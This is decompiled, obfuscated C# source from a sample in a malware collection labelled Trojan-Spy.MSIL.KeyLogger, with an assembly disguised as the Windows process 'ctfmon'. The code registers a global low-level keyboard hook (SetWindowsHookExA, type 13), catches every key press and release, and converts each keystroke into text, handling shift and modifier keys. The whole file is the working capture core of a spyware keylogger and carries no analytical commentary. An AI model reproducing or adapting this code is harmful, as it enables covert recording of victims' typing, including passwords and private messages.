// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ctfmon, Version=6.0.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 2B1874D2-B5D6-4FC2-9C40-41C2D3A7E9B2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.bxxf-29d0d8bb086c7360de2cb6bdee6fa1f914777123fb768702327d93adc7e2d1c9.exe

using \u0001;
using \u0004;
using \u0005;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace \u0005
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    private static List<WeakReference> \u0001;
    private static \u0002.\u0003 \u0001;
    private static \u0002.\u0004 \u0001;
    private static int \u0001;
    private static \u0002.\u0002 \u0001;

    [DebuggerNonUserCode]
    static \u0002()
    {
      \u0003.\u0002();
      \u0002.\u0001 = new List<WeakReference>();
    }

    [DebuggerNonUserCode]
    public \u0002() => \u0002.\u0002((object) this);

    [DebuggerNonUserCode]
    private static void \u0002([In] object obj0)
    {
      List<WeakReference> weakReferenceList = \u0002.\u0001;
      \u0010\u0002.\u001E\u0003((object) weakReferenceList);
      try
      {
        if (\u0002.\u0001.Count == \u0002.\u0001.Capacity)
        {
          int index1 = 0;
          int num = checked (\u0002.\u0001.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            WeakReference weakReference = \u0002.\u0001[index2];
            if (\u008D.\u007E\u001D\u0003((object) weakReference))
            {
              if (index2 != index1)
                \u0002.\u0001[index1] = \u0002.\u0001[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          \u0002.\u0001.RemoveRange(index1, checked (\u0002.\u0001.Count - index1));
          \u0002.\u0001.Capacity = \u0002.\u0001.Count;
        }
        \u0002.\u0001.Add(new WeakReference(\u001C\u0003.\u0083\u0004(obj0)));
      }
      finally
      {
        \u0010\u0002.\u001F\u0003((object) weakReferenceList);
      }
    }

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002([In] int obj0, [In] \u0002.\u0002 obj1, [In] int obj2, [In] int obj3);

    [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002([In] int obj0, [In] int obj1, [In] int obj2, [In] \u0002.\u0001 obj3);

    [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002([In] int obj0);

    [DebuggerNonUserCode]
    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    public static void \u0002([In] \u0002.\u0003 obj0) => \u0002.\u0001 = (\u0002.\u0003) \u001A\u0003.\u0094\u0002((Delegate) \u0002.\u0001, (Delegate) obj0);

    [DebuggerNonUserCode]
    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    public static void \u0003([In] \u0002.\u0003 obj0) => \u0002.\u0001 = (\u0002.\u0003) \u001A\u0003.\u0095\u0002((Delegate) \u0002.\u0001, (Delegate) obj0);

    public void \u0002()
    {
      \u0002 TargetObject = this;
      // ISSUE: virtual method pointer
      \u0002.\u0001 = new \u0002.\u0002((object) TargetObject, __vmethodptr(TargetObject, \u0002));
      \u0002.\u0001 = \u0002.\u0002(13, \u0002.\u0001, \u0088\u0003.\u001A\u0004(\u0092\u0002.\u007E\u009D\u0003((object) \u009F\u0002.\u009E\u0003())[0]).ToInt32(), 0);
    }

    private int \u0002([In] int obj0, [In] int obj1, [In] ref \u0002.\u0001 obj2)
    {
      if (obj0 == 0)
        goto label_7;
label_6:
      return \u0002.\u0002(\u0002.\u0001, obj0, obj1, obj2);
label_7:
      switch (obj1)
      {
        case 256:
        case 260:
          \u0002.\u0003 obj3 = \u0002.\u0001;
          if (obj3 != null)
          {
            obj3((Keys) obj2.\u0001);
            break;
          }
          break;
        case 257:
        case 261:
          \u0002.\u0004 obj4 = \u0002.\u0001;
          if (obj4 != null)
          {
            obj4((Keys) obj2.\u0001);
            break;
          }
          break;
      }
      goto label_6;
    }

    public void \u0003()
    {
      \u0002.\u0002(\u0002.\u0001);
      \u0010\u0002.\u001F\u0002((object) this);
    }

    public string \u0002([In] Keys obj0)
    {
      Keys keys = obj0;
      if (keys >= Keys.A && keys <= Keys.Z)
      {
        if (\u0080\u0002.\u0005\u0005(Keys.Capital))
          return \u0089\u0002.\u007E\u0081\u0002((object) obj0);
        return (\u0001\u0002.\u009F\u0004() & Keys.Shift) != Keys.None ? \u0089\u0002.\u007E\u0081\u0002((object) obj0) : \u0089\u0002.\u007E\u0088\u0002((object) \u0089\u0002.\u007E\u0081\u0002((object) obj0));
      }
      if (keys >= Keys.D0 && keys <= Keys.D9)
      {
        if ((\u0001\u0002.\u009F\u0004() & Keys.Shift) != Keys.None)
        {
          string str = \u0089\u0002.\u007E\u0081\u0002((object) obj0);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1603), false) == 0)
            return \u0002.\u0001(1608);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1613), false) == 0)
            return \u0002.\u0001(1618);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1623), false) == 0)
            return \u0002.\u0001(1628);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1633), false) == 0)
            return \u0002.\u0001(1638);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1643), false) == 0)
            return \u0002.\u0001(1648);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1653), false) == 0)
            return \u0002.\u0001(1658);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1663), false) == 0)
            return \u0002.\u0001(1668);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1673), false) == 0)
            return \u0002.\u0001(1678);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1683), false) == 0)
            return \u0002.\u0001(1688);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1693), false) == 0)
            return \u0002.\u0001(1698);
        }
        else
        {
          string str = \u0089\u0002.\u007E\u0081\u0002((object) obj0);
          return \u0012\u0003.\u007E\u0089\u0002((object) str, \u0002.\u0001(1703), \u0002.\u0001(340));
        }
      }
      else
      {
        if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
        {
          string str = \u0089\u0002.\u007E\u0081\u0002((object) obj0);
          return \u0012\u0003.\u007E\u0089\u0002((object) str, \u0002.\u0001(1708), \u0002.\u0001(340));
        }
        if (keys >= Keys.Multiply && keys <= Keys.Divide)
        {
          string str = \u0089\u0002.\u007E\u0081\u0002((object) obj0);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1717), false) == 0)
            return \u0002.\u0001(1726);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1731), false) == 0)
            return \u0002.\u0001(1678);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1744), false) == 0)
            return \u0002.\u0001(1757);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1762), false) == 0)
            return \u0002.\u0001(1767);
          if (\u0099\u0002.\u009A(str, \u0002.\u0001(1772), false) == 0)
            return \u0002.\u0001(1785);
        }
        else
        {
          if (keys == Keys.Space)
            return \u0002.\u0001(1086);
          if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
          {
            if ((\u0001\u0002.\u009F\u0004() & Keys.Shift) != Keys.None)
            {
              string str = \u0089\u0002.\u007E\u0081\u0002((object) obj0);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1790), false) == 0)
                return \u0002.\u0001(1803);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1808), false) == 0)
                return \u0002.\u0001(1767);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1821), false) == 0)
                return \u0002.\u0001(1842);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1847), false) == 0)
                return \u0002.\u0001(1856);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1861), false) == 0)
                return \u0002.\u0001(1870);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1875), false) == 0)
                return \u0002.\u0001(1884);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1889), false) == 0)
                return \u0002.\u0001(1898);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1903), false) == 0)
                return \u0002.\u0001(1916);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1921), false) == 0)
                return \u0002.\u0001(1934);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1939), false) == 0)
                return \u0002.\u0001(1956);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1961), false) == 0)
                return \u0002.\u0001(1974);
            }
            else
            {
              string str = \u0089\u0002.\u007E\u0081\u0002((object) obj0);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1790), false) == 0)
                return \u0002.\u0001(1757);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1808), false) == 0)
                return \u0002.\u0001(1979);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1821), false) == 0)
                return \u0002.\u0001(1984);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1847), false) == 0)
                return \u0002.\u0001(1989);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1861), false) == 0)
                return \u0002.\u0001(1994);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1875), false) == 0)
                return \u0002.\u0001(1999);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1889), false) == 0)
                return \u0002.\u0001(2004);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1903), false) == 0)
                return \u0002.\u0001(2009);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1921), false) == 0)
                return \u0002.\u0001(1785);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1939), false) == 0)
                return \u0002.\u0001(1726);
              if (\u0099\u0002.\u009A(str, \u0002.\u0001(1961), false) == 0)
                return \u0002.\u0001(2014);
            }
          }
          else
          {
            switch (keys)
            {
              case Keys.Back:
                try
                {
                  int num = \u008F.\u007E\u0084\u0002((object) \u0089\u0002.\u007E\u008B\u0005((object) \u0002.\u0002().\u0002().\u0002()));
                  \u001F\u0002.\u007E\u008C\u0005((object) \u0002.\u0002().\u0002().\u0002(), \u0084\u0003.\u007E\u008A\u0002((object) \u0089\u0002.\u007E\u008B\u0005((object) \u0002.\u0002().\u0002().\u0002()), checked (num - 1), 1));
                  break;
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  \u000E\u0003.\u009D();
                  break;
                }
              case Keys.Return:
                return \u008C\u0003.\u0002\u0003();
              case Keys.LWin:
                return \u0002.\u0001(2058);
              case Keys.RWin:
                return \u0002.\u0001(2058);
              case Keys.LShiftKey:
                return \u0002.\u0001(2019);
              case Keys.RShiftKey:
                return \u0002.\u0001(2019);
              case Keys.LControlKey:
                return \u0002.\u0001(2045);
              case Keys.RControlKey:
                return \u0002.\u0001(2045);
              case Keys.LMenu:
                return \u0002.\u0001(2032);
              case Keys.RMenu:
                return \u0002.\u0001(2032);
              default:
                return \u009E.\u008C\u0002(\u0002.\u0001(2071), \u0089\u0002.\u007E\u0081\u0002((object) obj0), \u0002.\u0001(2076));
            }
          }
        }
      }
      return (string) null;
    }

    private struct \u0001
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public int \u0005;
    }

    private delegate int \u0002(int nCode, int wParam, ref \u0002.\u0001 lParam);

    internal delegate void \u0003(Keys Key);

    internal delegate void \u0004(Keys Key);
  }
}
